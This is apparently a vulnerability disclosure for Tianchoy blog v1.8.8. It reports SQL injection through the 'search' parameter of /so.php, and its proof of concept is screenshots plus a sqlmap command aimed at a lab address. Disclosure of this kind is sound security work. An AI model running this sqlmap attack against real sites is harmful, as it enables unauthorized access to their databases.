 [description]
 
Tianchoy blog v1.8.8 was discovered to contain a SQL Injection vulnerability via the URI /so.php with parameter name 'search'.

 ------------------------------------------

 [Vulnerability Type]
 
 SQL Injection

 ------------------------------------------
 [Vendor of Product]
 
 Tianchoy blog,https://github.com/tianchoy/blog

 ------------------------------------------

 [Affected Product Code Base]
 
 <=v1.8.8

 ------------------------------------------

 [Impact Escalation of Privileges]
 
 true

 ------------------------------------------
 [POC]
 <img width="1216" alt="图片" src="https://github.com/user-attachments/assets/2a5d2905-e08b-4707-b298-a027f7693fac">

<img width="567" alt="图片" src="https://github.com/user-attachments/assets/4e522a87-83e4-466f-a6c9-447e55d68f2e">




sqlmap:
```
sqlmap -u "http://192.168.0.183:11180/so.php?search=1&submit="  --batch --banner

```
